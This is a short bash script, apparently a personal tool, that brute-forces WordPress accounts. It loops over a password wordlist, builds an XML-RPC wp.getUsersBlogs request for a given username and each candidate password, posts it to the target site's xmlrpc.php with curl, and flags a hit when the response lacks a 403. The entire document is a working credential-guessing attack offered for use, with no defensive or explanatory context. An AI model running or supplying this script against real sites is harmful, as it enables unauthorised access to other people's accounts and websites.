#!/bin/bash
# < me (at) alexiobash (dot) com >
# https://alexiobash.com
#

url=$1
user=$2
wordlist=$3

fuc_attack () {

cat << EOF > /tmp/brutexmlpayload.txt
<?xml version="1.0" encoding="iso-8859-1"?>
   <methodCall>
      <methodName>wp.getUsersBlogs</methodName>
         <params>
            <param><value>$user</value></param>
            <param><value>$password</value></param>
         </params>
   </methodCall>
EOF
	
}

for password in $(cat $wordlist); do
	fuc_attack
	body=$(curl --data @/tmp/brutexmlpayload.txt $url/xmlrpc.php > /tmp/brutexmlbody.txt 2>/dev/null) 
	if ! grep "403" /tmp/brutexmlbody.txt > /dev/null; then echo -e "USER: $user\nPASSWORD: OK"; fi
done

rm -f /tmp/brutexmlpayload.txt /tmp/brutexmlbody.txt

# end script
